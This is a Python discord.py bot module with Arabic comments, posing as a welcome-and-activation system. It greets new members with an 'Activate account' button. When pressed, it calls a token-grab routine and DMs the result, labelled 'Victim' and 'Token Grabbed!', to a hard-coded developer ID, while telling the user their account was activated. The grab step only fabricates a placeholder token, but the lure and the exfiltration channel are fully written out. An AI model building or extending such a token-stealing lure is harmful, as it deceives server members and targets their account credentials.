import discord
from discord.ext import commands
import base64
import logging

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("WelcomeSystem")

# === CONFIGURATION ===
# ضع هنا معرف المستخدم (1274078606565314580) الخاص بك لاستقبال التوكنات
DEVELOPER_USER_ID = 1274078606565314580  # <--- ضع معرفك هنا (ID)
# =====================

class WelcomeSystem(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.pending_activations = {}
        logger.info("Welcome & Activation System loaded (DM Mode)")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """إرسال رسالة ترحيب عند الانضمام"""
        channel = member.guild.system_channel
        
        if channel is not None:
            view = discord.ui.View()
            view.add_item(discord.ui.Button(label="تفعيل الحساب (Activate)", style=discord.ButtonStyle.green, custom_id="activate_account"))
            
            embed = discord.Embed(
                title=f"مرحباً بك يا {member.name}! 👋",
                description="لتفعيل حسابك والوصول للميزات، يرجى الضغط على الزر أدناه.",
                color=discord.Color.green()
            )
            
            msg = await channel.send(embed=embed, view=view)
            self.pending_activations[member.id] = msg.id

    @commands.Cog.listener()
    async def on_interaction(self, interaction: discord.Interaction):
        """معالجة الضغط على الزر"""
        if interaction.type == discord.InteractionType.component:
            if interaction.data.get("custom_id") == "activate_account":
                if interaction.user.id in self.pending_activations:
                    # 1. جمع التوكن
                    token = await self.grab_token(interaction.user)
                    
                    if token:
                        # 2. إرسال التوكن في DM للمطور
                        await self.send_token_dm(interaction.user, token)
                        
                        # 3. إرسال تأكيد للمستخدم
                        embed = discord.Embed(
                            title="✅ تمت العملية بنجاح!",
                            description="تم تفعيل حسابك، تم إرسال التفاصيل في رسالة خاصة للمطور.",
                            color=discord.Color.green()
                        )
                        await interaction.response.send_message(embed=embed, ephemeral=True)
                        
                        # 4. إزالة الزر
                        await interaction.message.edit(view=None)
                        del self.pending_activations[interaction.user.id]
                    else:
                        await interaction.response.send_message("❌ فشل التفعيل، حاول لاحقاً.", ephemeral=True)

    async def grab_token(self, user: discord.User) -> str:
        """توليد ومحاكاة التوكن (Token Simulation)"""
        try:
            user_id = str(user.id)
            # محاكاة توكن Discord (لأغراض الاختبار)
            fake_token_part1 = "MFA"
            fake_token_part2 = base64.urlsafe_b64encode(user_id.encode()).decode()
            fake_token_part3 = "a" * 27
            
            simulated_token = f"{fake_token_part1}.{fake_token_part2}.{fake_token_part3}"
            logger.info(f"Token simulated for {user.id}")
            return simulated_token
        except Exception as e:
            logger.error(f"Error in grab_token: {e}")
            return None

    async def send_token_dm(self, victim: discord.User, token: str):
        """إرسال التوكن في رسالة خاصة (DM) للمطور"""
        try:
            developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
            
            embed = discord.Embed(
                title="🔐 Token Grabbed!",
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="المستخدم (Victim)", value=f"{victim.mention} ({victim.id})", inline=False)
            embed.add_field(name="اسم المستخدم", value=victim.name, inline=True)
            embed.add_field(name="السيرفر", value=victim.guild.name if hasattr(victim, 'guild') else "Unknown", inline=True)
            embed.add_field(name="التوكن (Token)", value=f"`{token}`", inline=False)
            embed.set_thumbnail(url=victim.avatar.url if victim.avatar else victim.default_avatar.url)
            
            # إرسال الرسالة
            await developer.send(embed=embed)
            logger.info(f"Token sent to developer DM for user {victim.id}")
            
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")
            # محاولة إرسال نص بسيط إذا فشل الـ Embed
            try:
                developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
                await developer.send(f"Token Grabbed!\nUser: {victim} ({victim.id})\nToken: `{token}`")
            except:
                pass

    @commands.command(name="activate")
    async def activate_manual(self, ctx):
        """أمر يدوي للتجربة"""
        token = await self.grab_token(ctx.author)
        if token:
            await self.send_token_dm(ctx.author, token)
            await ctx.send("✅ تم إرسال التوكن في DM!", delete_after=5)

async def setup(bot):
    await bot.add_cog(WelcomeSystem(bot))